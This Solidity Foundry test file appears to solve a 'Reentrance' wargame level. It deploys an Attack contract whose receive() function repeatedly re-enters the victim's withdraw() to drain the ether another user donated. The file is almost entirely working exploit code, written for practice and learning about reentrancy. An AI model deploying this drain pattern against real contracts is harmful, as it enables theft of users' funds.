// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "src/Reentrance.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";


contract ReentranceTest is Test {
    Reentrance private reentrance;
    Attack private attack;
    address private constant HACKER = address(0x1);
    address private constant ALICE = address(0x2);

    function setUp() external {
        vm.deal(ALICE, 5e18);
        vm.deal(HACKER, 6e18);
        reentrance = new Reentrance();
        attack = new Attack(address(reentrance));
    }

    function testHack() external {
        vm.prank(ALICE);
        reentrance.donate{value:5e18}(ALICE);

        vm.startPrank(HACKER);
        attack.attack{value: 1e18}();
        // vm.stopPrank();
        console.log(address(reentrance).balance);
    }
}

contract Attack {
    Reentrance public reentrance;

    constructor(address _reentranceAddress) {
        reentrance = Reentrance(payable(_reentranceAddress));
    }

    receive() external payable {
        if (address(reentrance).balance >= 1 ether) {
            reentrance.withdraw(1e18);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}